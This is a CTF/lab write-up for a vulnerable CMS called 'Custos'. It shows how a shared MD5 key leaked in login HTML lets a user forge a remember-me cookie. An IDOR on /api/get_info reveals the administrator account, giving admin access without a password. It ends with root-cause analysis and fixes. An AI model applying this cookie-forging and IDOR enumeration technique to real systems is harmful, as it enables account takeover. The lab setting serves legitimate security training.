# Custos Pwnbox Lab - Remember-Me MD5 Cookie Forge + User IDOR

Date: 2026-07-10
Target type: CTF/lab
Host: `https://6160fe80ee28.pwnbox-lab.com/`
Bug class: Broken authentication (client-built remember-me cookie), shared MD5 signing key disclosure, IDOR user enumeration

## Observation

Landing page: **Custos — a study in broken trust**.

About:

```text
A small CMS has around 50 users. Some credentials leaked (john / password),
but the author insists other accounts are safe. Prove him wrong — become admin.
```

UI hints: `enter · auth · session · md5`, `ch.01 — forget-me`.

Scripts:

- `/js/c.js` — cookie helpers + remember-me `rc` builder
- `/js/md5.js` — `calcMD5`
- `/js/s.js` — stores key/expiry/username into `localStorage` after login
- `/js/p.js` — profile calls `POST /api/get_info` with `user_id`

Login as `john` / `password` with **Keep me logged-in** returns hidden fields:

```html
<input name="0" value="1">           <!-- remember enabled -->
<input name="1" value="[md5-key]">   <!-- shared signing key -->
<input name="2" value="[expiry]">
<input name="3" value="john">
```

Cookies set:

```text
userid=<base64(numeric_id)>   # john -> Mg== (id 2)
username=john
session.sid=...               # HttpOnly express session
```

`c.js` builds:

```javascript
data = ui + '|' + u + '|' + calcMD5(k + ui + u)
set_cookie('rc', btoa(data), e)
```

## Hypothesis

Remember-me authenticity is MD5(key + userid + username) with a **global** key embedded in HTML. If the key is shared and userid/username are attacker-chosen, any account’s `rc` can be forged. Admin identity can be found via IDOR on `/api/get_info`.

## Evidence

### Low-privilege profile

As john, `/profile` shows non-admin scope; flag gated behind admin role.

### IDOR

```text
POST /api/get_info  user_id=2
→ {"id":"2","display_name":"John Doe","user":"john"}

POST /api/get_info  user_id=47
→ {"id":"47","display_name":"Website's Administrator","user":"administrator_[id]"}
```

Most ids 1–55 return `user not found`; sparse user table (~50 accounts claimed).

### Cookie forge

```text
ui = base64(47) = NDc=
u  = administrator_[id]
rc = btoa(ui + '|' + u + '|' + md5(key + ui + u))
```

Visit `/login` with `userid`, `username`, and `rc` (no password) → server restores admin session → `/profile` shows flag.

## Failed assumptions

1. Mutating `username=admin` while keeping john’s userid — rejected / login page.
2. Guessing admin username without IDOR — wrong; real username is `administrator_[digits]`.
3. Key unique per user — confirmed same key across remember-me logins for john.
4. `rc` alone without matching `userid`/`username` cookies — incomplete; all three needed.

## Root cause

1. Shared, client-visible MD5 key for remember-me MAC.
2. Client constructs the integrity cookie; server trusts it for session restore.
3. `/api/get_info` lacks object-level authorization (any logged-in user can read any id).

## Fix

- Server-side opaque remember-me tokens (random, hashed at rest, bound to user id).
- Never embed signing secrets in HTML/JS.
- If a MAC is used, use HMAC with a server-only secret and rotate keys.
- Enforce ownership/authorization on `/api/get_info`.
- Prefer HttpOnly, Secure cookies for session restore tokens.

## Reusable outputs

- `writeups/custos-remember-me-md5-cookie-forge.md`
- `notes/remember-me-client-md5-cookie-forge.md`
- `payloads/auth/remember-me-md5-rc-cookie-forge.md`
- Updates to `checklists/client-side-session-trust-recon.md`
